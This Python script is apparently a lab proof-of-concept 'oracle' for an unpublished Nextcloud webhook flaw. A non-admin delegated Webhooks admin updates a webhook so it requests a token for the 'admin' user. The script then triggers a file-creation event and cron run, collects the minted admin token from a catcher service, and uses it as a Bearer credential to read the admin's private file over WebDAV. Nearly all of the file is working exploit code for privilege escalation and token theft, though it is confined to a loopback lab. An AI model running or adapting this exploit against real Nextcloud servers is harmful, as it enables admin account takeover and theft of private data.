#!/usr/bin/env python3
"""Local oracle for unpublished Nextcloud webhook update tokenNeeded.

Delegated Webhooks admin (not instance admin) creates a webhook (create strips
tokenNeeded) then updates the same id with tokenNeeded.user_ids=["admin"].
NodeCreatedEvent + cron mints a 1h admin PERMANENT_TOKEN posted to the catcher.
Unauth Bearer DAV reads the admin private witness file.

Loopback only. No shells. No ExApp path.
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "NEXTCLOUD-WEBHOOK-TOKENNEEDED"
WITNESS = "NEXTCLOUD-WEBHOOK-TOKENNEEDED-WITNESS"
EVENT = r"OCP\Files\Events\Node\NodeCreatedEvent"
DEFAULT_BASE = "http://127.0.0.1:18320"
DEFAULT_HOOK = "http://127.0.0.1:18321"
DEFAULT_ADMIN = "admin"
DEFAULT_HOOKER = "hooker"
DEFAULT_HOOKER_PASSWORD = "LabHooker35!"
DEFAULT_COMPOSE_PROJECT = "nextcloud-webhook-tokenneeded"
USER_AGENT = "nextcloud-webhook-tokenneeded-lab"
HOOK_URI = "http://hook:8080/hook"
WEBHOOKS_PATH = "/ocs/v2.php/apps/webhook_listeners/api/v1/webhooks"
HTTP_TIMEOUT_S = 60.0
CATCHER_TIMEOUT_S = 10.0
COMPOSE_TIMEOUT_S = 120
CRON_TIMEOUT_S = 180
CRON_ATTEMPTS = 8
OK_CREATE = (200, 201)
OK_PUT = (200, 201, 204)


class LabError(RuntimeError):
    """Abort the oracle. The message is the FAIL reason without the prefix."""


@dataclass(frozen=True)
class Config:
    here: Path
    base: str
    hook: str
    admin: str
    hooker: str
    hooker_password: str
    compose_project: str

    @classmethod
    def from_env(cls) -> Config:
        return cls(
            here=Path(__file__).resolve().parent,
            base=os.environ.get("NC_URL", DEFAULT_BASE).rstrip("/"),
            hook=os.environ.get("HOOK_URL", DEFAULT_HOOK).rstrip("/"),
            admin=os.environ.get("NC_ADMIN_USER", DEFAULT_ADMIN),
            hooker=os.environ.get("NC_HOOKER_USER", DEFAULT_HOOKER),
            hooker_password=os.environ.get("NC_HOOKER_PASSWORD", DEFAULT_HOOKER_PASSWORD),
            compose_project=os.environ.get("COMPOSE_PROJECT_NAME", DEFAULT_COMPOSE_PROJECT),
        )


def fail(reason: str) -> int:
    print(f"FAIL {LABEL} {reason}", flush=True)
    return 1


def basic(user: str, password: str) -> str:
    token = base64.b64encode(f"{user}:{password}".encode("utf-8")).decode("ascii")
    return f"Basic {token}"


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = HTTP_TIMEOUT_S,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": USER_AGENT}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return int(resp.status), {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as exc:
        return int(exc.code), {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except urllib.error.URLError as exc:
        raise LabError(f"http {method} {url} error {exc}") from exc


def ocs(
    cfg: Config,
    method: str,
    path: str,
    user: str,
    password: str,
    payload: dict[str, Any] | None = None,
) -> tuple[int, dict[str, Any]]:
    body = None if payload is None else json.dumps(payload).encode("utf-8")
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": basic(user, password),
    }
    if payload is not None:
        hdrs["Content-Type"] = "application/json"
    sep = "&" if "?" in path else "?"
    url = cfg.base + path + sep + "format=json"
    code, _, raw = http(method, url, data=body, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        parsed: Any = json.loads(text) if text else {}
    except json.JSONDecodeError as exc:
        raise LabError(
            f"ocs {method} {path} http={code} not json body={text[:400]!r}"
        ) from exc
    if not isinstance(parsed, dict):
        raise LabError(f"ocs {method} {path} http={code} not json body={text[:400]!r}")
    return code, parsed


def ocs_data(parsed: dict[str, Any]) -> Any:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def ocs_meta(parsed: dict[str, Any]) -> dict[str, Any]:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict) and isinstance(ocs_wrap.get("meta"), dict):
        return ocs_wrap["meta"]
    return {}


def token_needed_uids(obj: object) -> list[str]:
    if not isinstance(obj, dict):
        return []
    tn = obj.get("tokenNeeded")
    if tn is None:
        tn = obj.get("token_needed")
    if isinstance(tn, str):
        try:
            tn = json.loads(tn)
        except json.JSONDecodeError:
            return []
    if not isinstance(tn, dict):
        return []
    uids = tn.get("user_ids") or tn.get("userIds") or []
    if isinstance(uids, list):
        return [str(x) for x in uids]
    return []


def webhook_body(admin: str) -> dict[str, Any]:
    return {
        "httpMethod": "POST",
        "uri": HOOK_URI,
        "event": EVENT,
        "eventFilter": {},
        "userIdFilter": "",
        "headers": {},
        "authMethod": "none",
        "authData": {},
        "tokenNeeded": {"user_ids": [admin]},
    }


def hooker_groups(data: object) -> Any:
    groups: Any = []
    if not isinstance(data, dict):
        return groups
    groups = data.get("groups") or []
    if isinstance(groups, dict):
        groups = list(groups.values()) if not groups.get("element") else groups.get("element")
    raw_groups = data.get("groups")
    if isinstance(raw_groups, dict) and "element" in raw_groups:
        el = raw_groups["element"]
        groups = el if isinstance(el, list) else [el]
    return groups


def compose_exec(
    cfg: Config,
    *args: str,
    timeout: int = COMPOSE_TIMEOUT_S,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", cfg.compose_project, "exec", "-T", *args],
        cwd=cfg.here,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )


def run_cron(cfg: Config) -> None:
    proc = compose_exec(
        cfg,
        "-u",
        "www-data",
        "nextcloud",
        "php",
        "-f",
        "/var/www/html/cron.php",
        timeout=CRON_TIMEOUT_S,
    )
    print(
        f"IOC cron rc={proc.returncode} stdout={proc.stdout.strip()[:200]!r} "
        f"stderr={proc.stderr.strip()[:200]!r}",
        flush=True,
    )


def fetch_catcher(cfg: Config) -> dict[str, Any]:
    code, _, raw = http("GET", cfg.hook + "/last", timeout=CATCHER_TIMEOUT_S)
    text = raw.decode("utf-8", "replace")
    print(f"IOC catcher http={code} bytes={len(raw)}", flush=True)
    if not text.strip() or text.strip() == "{}":
        return {}
    try:
        parsed: Any = json.loads(text)
    except json.JSONDecodeError as exc:
        raise LabError(f"catcher not json body={text[:400]!r}") from exc
    if not isinstance(parsed, dict):
        raise LabError(f"catcher json not object type={type(parsed).__name__}")
    return parsed


def extract_admin_token(payload: dict[str, Any], admin: str) -> str:
    auth = payload.get("authentication")
    if not isinstance(auth, dict) or not auth:
        raise LabError("empty authentication")
    print(f"IOC authentication-keys={list(auth.keys())}", flush=True)
    user_ids = auth.get("user_ids")
    if not isinstance(user_ids, dict):
        raise LabError(f"authentication.user_ids missing keys={list(auth.keys())}")
    admin_blob = user_ids.get(admin)
    if not isinstance(admin_blob, dict):
        raise LabError(
            f"authentication.user_ids.{admin} missing have={list(user_ids.keys())}"
        )
    token = admin_blob.get("token")
    uid = admin_blob.get("userId") or admin_blob.get("user_id")
    print(f"IOC stolen-token uid={uid!r} token_len={len(str(token or ''))}", flush=True)
    if not token:
        raise LabError("authentication.user_ids.admin.token missing")
    if uid and str(uid) != admin:
        raise LabError(f"stolen token uid={uid!r} expected={admin!r}")
    return str(token)


def wait_for_catcher(cfg: Config) -> dict[str, Any]:
    payload: dict[str, Any] = {}
    for i in range(CRON_ATTEMPTS):
        run_cron(cfg)
        payload = fetch_catcher(cfg)
        auth = payload.get("authentication") if isinstance(payload, dict) else None
        if isinstance(auth, dict) and auth:
            print(f"IOC catcher-ready attempt={i}", flush=True)
            return payload
        keys = list(payload.keys()) if payload else []
        print(f"IOC catcher-wait attempt={i} keys={keys}", flush=True)
        time.sleep(2)
    raise LabError("catcher empty after cron")


def run(cfg: Config) -> int:
    print(
        f"IOC base={cfg.base} hook={cfg.hook} actor={cfg.hooker} target_uid={cfg.admin}",
        flush=True,
    )

    code, parsed = ocs(
        cfg,
        "GET",
        "/ocs/v2.php/cloud/users/" + cfg.hooker,
        cfg.hooker,
        cfg.hooker_password,
    )
    groups = hooker_groups(ocs_data(parsed))
    print(f"IOC hooker-login http={code} groups={groups}", flush=True)
    if code not in OK_CREATE:
        raise LabError(f"hooker login/info http={code} meta={ocs_meta(parsed)}")
    if cfg.admin in [str(g) for g in groups]:
        raise LabError("hooker is in admin group (wrong fixture)")

    body = webhook_body(cfg.admin)
    code, parsed = ocs(
        cfg,
        "POST",
        WEBHOOKS_PATH,
        cfg.hooker,
        cfg.hooker_password,
        body,
    )
    data = ocs_data(parsed)
    print(
        f"IOC create http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:800]}",
        flush=True,
    )
    if code not in OK_CREATE or not isinstance(data, dict):
        raise LabError(f"create webhook http={code} meta={ocs_meta(parsed)}")
    webhook_id = data.get("id")
    if webhook_id is None:
        raise LabError("create webhook missing id")
    create_uids = token_needed_uids(data)
    if cfg.admin in create_uids:
        print("IOC create-tokenNeeded-not-stripped uids=" + ",".join(create_uids), flush=True)
    else:
        print(f"IOC create-stripped tokenNeeded={data.get('tokenNeeded')!r}", flush=True)

    code, parsed = ocs(
        cfg,
        "POST",
        f"{WEBHOOKS_PATH}/{webhook_id}",
        cfg.hooker,
        cfg.hooker_password,
        body,
    )
    data = ocs_data(parsed)
    print(
        f"IOC update http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:800]}",
        flush=True,
    )
    if code == 403:
        raise LabError("update 403")
    if code not in OK_CREATE:
        raise LabError(f"update webhook http={code} meta={ocs_meta(parsed)}")

    code, parsed = ocs(
        cfg,
        "GET",
        f"{WEBHOOKS_PATH}/{webhook_id}",
        cfg.hooker,
        cfg.hooker_password,
    )
    data = ocs_data(parsed)
    print(f"IOC get http={code} data={json.dumps(data)[:800]}", flush=True)
    if not isinstance(data, dict):
        raise LabError(f"get webhook http={code} meta={ocs_meta(parsed)}")
    stored_uids = token_needed_uids(data)
    print(f"IOC stored-tokenNeeded-uids={stored_uids}", flush=True)
    if cfg.admin not in stored_uids:
        raise LabError("tokenNeeded stripped on update")

    trigger_name = f"trigger-{int(time.time())}.txt"
    trigger_path = f"/remote.php/dav/files/{cfg.hooker}/{trigger_name}"
    put_code, _, put_body = http(
        "PUT",
        cfg.base + trigger_path,
        data=b"trigger-node-created",
        headers={
            "Authorization": basic(cfg.hooker, cfg.hooker_password),
            "Content-Type": "text/plain",
        },
    )
    print(
        f"IOC trigger-put http={put_code} path={trigger_path} body={put_body[:120]!r}",
        flush=True,
    )
    if put_code not in OK_PUT:
        raise LabError(f"trigger PUT http={put_code} body={put_body[:300]!r}")

    payload = wait_for_catcher(cfg)
    if not payload.get("authentication"):
        raise LabError("empty authentication")

    token = extract_admin_token(payload, cfg.admin)

    dav_path = f"/remote.php/dav/files/{cfg.admin}/{WITNESS}.txt"
    dav_code, dav_hdrs, dav_body = http(
        "GET",
        cfg.base + dav_path,
        headers={"Authorization": f"Bearer {token}"},
    )
    text = dav_body.decode("utf-8", "replace")
    xuid = dav_hdrs.get("x-user-id", "")
    print(
        f"IOC dav-bearer http={dav_code} x-user-id={xuid!r} body={text[:200]!r}",
        flush=True,
    )
    if dav_code != 200:
        raise LabError(f"dav bearer http={dav_code} body={text[:300]!r}")
    if WITNESS not in text:
        raise LabError(f"dav body missing witness got={text[:200]!r}")

    print(
        f"SUCCESS {LABEL} who=delegated-webhook-admin uid={cfg.admin} {WITNESS}",
        flush=True,
    )
    return 0


def main() -> int:
    try:
        return run(Config.from_env())
    except LabError as exc:
        return fail(str(exc))
    except Exception as exc:
        return fail(f"unhandled {type(exc).__name__}: {exc}")


if __name__ == "__main__":
    raise SystemExit(main())
